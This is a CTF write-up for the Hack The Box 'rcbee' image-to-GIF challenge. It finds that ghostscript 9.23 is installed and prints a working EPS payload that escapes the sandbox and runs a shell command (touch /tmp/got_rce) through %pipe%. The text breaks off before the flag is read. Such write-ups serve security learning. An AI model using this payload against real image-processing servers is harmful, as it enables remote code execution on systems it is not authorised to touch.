# rcbee


### Challenge Author(s): [makelaris](https://app.hackthebox.eu/users/107)&[makelarisjr](https://app.hackthebox.eu/users/95)

### Description: 
   ```
   Bees are comfy 🍯  
bees are great 🌟🌟🌟  
this is a petpet generator 👋  
let's join forces and save the bees today! 🐝
   ```
### Difficulty: `Easy`
---
# Challenge

The site is nothing much special it converts uploaded images into gifs, we can see the directory where they are stored in from source code.

Only `png`, `jpg` and 	`jpeg` are allowed and extension bypassing is not working.

We check the docker file from the downloadable files and we see an unusual download which I previously didn't see in other challenges.

It downloaded `ghostscript-9.23`. So I search for it.

I found multiple vulnerabilities on [Exploit-DB](https://www.exploit-db.com/exploits/45243) and found this for the image

![[Pasted image 20210819214120.png]]

The above didn't work, So I started searching `GhostScript ECE Docker`  as this docker was running in the docker and found the following payload on github.

```bash
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
```

We can see that the flag is named as `flag` from the downloadable docker files. So we'll have to cat it and put it into a readable file on the site